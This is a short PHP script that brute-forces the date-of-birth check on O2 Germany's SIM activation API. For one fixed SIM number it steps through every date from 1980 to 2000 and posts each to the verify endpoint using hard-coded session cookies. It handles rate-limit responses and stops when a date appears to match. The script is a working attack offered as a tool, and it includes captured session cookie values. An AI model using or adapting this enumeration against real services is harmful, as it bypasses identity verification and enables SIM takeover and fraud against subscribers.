<?php
require_once('curl.easy.class.php');

$simCardNumber = '1234567890123456789';
$startDay = 1;
$endDay = 31;
$startMonth = 1;
$endMonth = 12;
$startYear = 1980;
$endYear = 2000;

$currentDay = $startDay;
$currentMonth = $startMonth;
$currentYear = $startYear;

$try = 0;
$curl = new EasyCurl();
while($currentYear < $endYear){

	$testDate = $currentYear.'-'.(($currentMonth < 10)?'0':'').$currentMonth.'-'.(($currentDay < 10)?'0':'').$currentDay;
	echo "Testing Date: $testDate\n";

	$r_post = json_encode(['iccid' => $simCardNumber,'msisdn' => null,'puk2' => null,'dob' => $testDate]);
	$json_response = $curl->post('https://sim-aktivieren.o2online.de/api/v1/1/activation/postpaid/verify', $r_post, ['Accept: application/json, text/plain, */*', 'Content-Type: application/json;charset=utf-8', 'X-JM-TRACEID: 9c0bc9bd-51e2-4357-9e1e-6a16db16c306', 'Referer: https://sim-aktivieren.o2online.de/geburtstag', 'Cookie: touchPoints=P|20220421110448; cust=CUST%3A0%23FV%3A1650539088212%23; CSLjm=9c7aa1f42c1ed624; trbo_usr=fc56a60048f10a1f65e6c280a13b101e; trbo_debug=0; di=vSl0JWZlcwzXsI2yJheO6gAAAYBL1eFf; dis=vSl0JWZlcwzXsI2yJheO6gAAAYBL1eFf']);

	echo json_encode($json_response)."\n----------\n";

	// if response is invalid date, try next one
	$json_result = json_decode($json_response[1], true);
	if($json_response[0] != 429){
		if($json_result['code'] == 'AUTHENTICATION_DOB_MISMATCH' || isset($json_result['validationErrors'])){
			$currentDay++;
			if(isset($json_result['validationErrors'])){
				$currentDay = 32;
			}
			if($currentDay > 31){
				$currentMonth++;
				$currentDay = 1;
			}
			if($currentMonth > 12){
				$currentYear++;
				$currentMonth = 1;
			}
		}else{
			// possible valid result
			if($json_response[0] != 400){
				exit('Result?');
			}
		}
	}

	sleep(2);
}
